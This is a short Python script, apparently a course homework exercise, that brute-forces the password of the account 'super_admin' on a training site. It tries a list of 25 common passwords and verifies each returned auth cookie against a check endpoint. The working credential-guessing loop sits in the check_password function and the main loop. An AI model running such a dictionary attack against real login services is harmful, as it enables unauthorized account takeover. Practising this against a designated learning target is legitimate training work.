import requests

# Set login
login = "super_admin"

# Set list of passwords for check
passwords = [
    "123456", "123456789", "qwerty", "password", "1234567",
    "12345678", "12345", "iloveyou", "111111", "123123",
    "abc123", "qwerty123", "1q2w3e4r", "admin", "qwertyuiop",
    "654321", "555555", "lovely", "7777777", "welcome",
    "888888", "princess", "dragon", "password1", "123qwe"
]


# Set function for checking password
def check_password(password_to_check):
    # Form parameters of request
    payload = {"login": login, "password": password_to_check}

    # Send POST-request to receive cookies:
    response = requests.post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework", data=payload)

    # If status 500 is returned, there is an error on the server (password is not correct)
    if response.status_code == 500:
        return False

    # Get the cookie value
    auth_cookie = response.cookies.get("auth_cookie")

    # If cookie is received, send GET-request to check
    if auth_cookie:
        cookies = {"auth_cookie": auth_cookie}
        check_response = requests.get("https://playground.learnqa.ru/ajax/api/check_auth_cookie", cookies=cookies)

        # If the phrase "You are NOT authorized" is returned, then password is incorrect
        if "You are NOT authorized" in check_response.text:
            return False

        # If the phrase is absent, then password is correct
        return True

    return False


# Check passwords from the list
for password in passwords:
    # Check current password
    if check_password(password):
        # If password is correct, print it and interrupt the loop
        print(f"Password is correct: {password}")
        break

else:
    # If the loop ends without finding the correct password
    print("Password is not found")
